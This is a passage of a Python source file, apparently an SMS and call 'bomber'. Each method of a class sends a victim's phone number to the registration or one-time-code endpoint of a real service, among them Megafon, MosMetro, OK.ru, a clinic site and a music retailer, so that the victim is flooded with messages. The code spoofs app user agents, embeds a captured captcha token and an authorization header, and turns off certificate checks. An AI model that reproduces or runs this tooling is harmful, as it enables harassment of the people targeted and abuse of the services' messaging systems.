        post("https://bank.megafon.ru/mobileapi/api/v31/user/register/",
             json={"phone_number": self.phone, "platform": "android", "recovery": "false"})

    def megafon_tv(self):
        try:
            post("https://bmp.megafon.tv/api/v10/auth/register/msisdn", json={'msisdn': self.phone, 'password': "91234657"}, cookies=get('https://megafon.tv/').cookies)
        except:
            pass

    def meloman(self):
        post('https://www.meloman.kz/customer/account/loginAjaxSendCodePost/', json={'phone': pformat(self.phone, '+*(***)***-**-**'), 'canSendCode': 'true'})  # mail bomber

    def melzdrav(self):
        post("https://melzdrav.ru/local/templates/mz_gtech/ajax/sms.php", params={"ajaxtype": "SEND-SMS", 'PHONE': pformat(self.phone, "* (***) ***-**-**")})

    def mfc(self):
        post("https://api.mfc-d.com/v1/auth/phone", params={'phone': self.pphone}, headers={"User-Agent": "MFC/1.2.40 (com.mfcd.digital; build:68; Android 11 (30))"})

    def moezdorovie(self):
        post("https://moezdorovie.ru/rpc/?method=auth.GetCode", json={"jsonrpc": "2.0", "id": 39, "method": "auth.GetCode", "params": {"phone": self.phone[1:], "mustExist": False, "sendRealSms": True}}, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 11; None Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"})

    def mosmetro(self):
        post("https://lk.mosmetro.ru/auth/connect/otp", data={"username": self.phone}, headers={"User-Agent": "MosMetro/3.3.0 (2412) (Android; Xiaomi M2010J19SY; 11; 886432643)", "Authorization": "Basic ZjFkYWM2MDgtZGQzNS00NzE3LThjYmItMThlMmY3YTFkNTIyOnRoZV9zZWNyZXQ="})

    def ok(self):
        post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": self.pphone})

    def newtel(self):
        post('https://new-tel.net/ajax/a_api.php', params={'type': 'reg'},
             data={'phone_nb': pformat(self.phone, '+* (***) ***-****'), 'phone_number': 'Хочу номер',
                   'token': '03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz'},
             headers={'accept': 'application/json, text/javascript, */*; q=0.01',
                      'accept-encoding': 'gzip, deflate, br', 'accept-language': 'ru,en;q=0.9', 'content-length': '494',
                      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                      'origin': 'https://new-tel.net', 'referer': 'https://new-tel.net/uslugi/call-password/',
                      'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36',
                      'x-requested-with': 'XMLHttpRequest'}, verify=False)


